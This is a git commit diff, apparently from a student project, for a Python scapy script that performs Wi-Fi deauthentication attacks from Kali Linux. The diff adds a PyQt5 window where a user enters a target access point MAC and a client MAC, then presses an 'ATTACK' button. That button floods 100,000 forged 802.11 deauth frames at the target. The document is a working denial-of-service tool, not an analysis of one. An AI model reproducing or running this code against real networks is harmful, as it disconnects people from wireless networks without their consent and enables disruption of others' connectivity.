1fcc076db89b717d2347824c977685d5e0e8622e
SebastianFischer164158 <s164158@student.dtu.dk>
2019-05-01 17:00:04 -0400

    Update WiFiDeAuthentication.py
    Skal køres med Python 3.6 i Kali linux med en USB wireless interface.

--- WiFiDeAuthentication.py
+++ WiFiDeAuthentication.py
@@ -1,20 +1,17 @@
-"""
-Skal køres via Kali linux -- kræver at interfacet er i monitor mode i forvejen lige pt.
-
-@@airmon-ng wlan0 start@@
-done.
-
-"""
+import sys
+from PyQt5.QtWidgets import QMainWindow, QApplication,QPushButton,QLineEdit, QTextEdit, QLabel
+from PyQt5 import QtGui
+from PyQt5.QtCore import pyqtSlot
 import time
 from scapy.all import *
 from subprocess import call
 from subprocess import check_output
-
+import re
 
 iface = "wlan0mon"
 timeout = 1
-dest = "94:65:2D:D8:2E:16"
-bssid = "40:F2:01:9A:42:56"
+#dest = "94:65:2D:D8:2E:16"
+#bssid = "40:F2:01:9A:42:56"
 
 
 
@@ -32,7 +29,8 @@ def setMonitorMode():
 		if checkphrase_mon_success in airmoncheck:
 			print("Sucessfully set wlan0 to Monitor Mode (now called wlan0mon)!")
 		else:
-			print("wlan0 has not entered Monitor Mode, recheck.")
+			raise SystemExit("wlan0 has not entered Monitor Mode, recheck.")
+
 
 
 
@@ -53,12 +51,73 @@ def perform_deauth_attack(interface,dest,bssid,amount):
 	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
 	frame = radio_p/dot11_frame/deauth
 
-	hexdump(frame)
-	ls(frame)
-	frame.summary()
-	frame.pdfdump()
+	#hexdump(frame)
+	#ls(frame)
+	#frame.summary()
+
 	sendp(frame,iface=interface, count=amount,inter=0.02) #'wlan0mon'
 
 
 setMonitorMode()
-perform_deauth_attack(iface,dest,bssid,1)
+#perform_deauth_attack(iface,dest,bssid,1)
+class App(QMainWindow):
+	def __init__(self):
+		super().__init__()
+		self.title = "hello there"
+		self.setupUI()
+
+	def setupUI(self):
+		self.setWindowTitle(self.title)
+		self.setGeometry(50,50,700,700)
+
+
+		#MAC AP
+		self.textboxAP = QLineEdit(self)
+		self.textboxAP.setPlaceholderText("Enter the target AP MAC address")
+		self.textboxAP.move(20,40)
+		self.textboxAP.resize(280, 40)
+		#MAC TARGET
+		self.textbox = QLineEdit(self)
+		self.textbox.setPlaceholderText("Enter the target MAC address")
+		self.textbox.move(20,100)
+		self.textbox.resize(280,40)
+
+
+		##ATTACK button
+		self.attackbutton = QPushButton('ATTACK',self)
+		self.attackbutton.resize(200,50)
+		self.attackbutton.move(350,65)
+		self.attackbutton.clicked.connect(self.on_attackclick)
+
+
+
+
+
+		self.show()
+	@pyqtSlot()
+	def on_attackclick(self):
+		self.textboxAP.setEnabled(False)
+		self.textbox.setEnabled(False)
+		bssid_targetMAC = self.textboxAP.text() #string
+		destMAC = self.textbox.text() #string
+		print(bssid_targetMAC)
+		print(destMAC)
+		matchexpr = "[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$" #regex match
+		if re.match(matchexpr, bssid_targetMAC.lower()) and re.match(matchexpr,destMAC.lower()):#checks if both inputs are valid MAC addreses (just format)
+			perform_deauth_attack(iface, destMAC, bssid_targetMAC, 100000)
+
+
+
+		else:
+			self.textboxAP.setPlaceholderText("Enter valid AP MAC address")
+			self.textbox.setPlaceholderText("Enter valid destination MAC address")
+			self.textboxAP.setEnabled(True)
+			self.textbox.setEnabled(True)
+			self.textbox.clear()
+			self.textboxAP.clear()
+
+
+if __name__ == '__main__':
+	app = QApplication(sys.argv)
+	ex = App()
+	sys.exit(app.exec_())
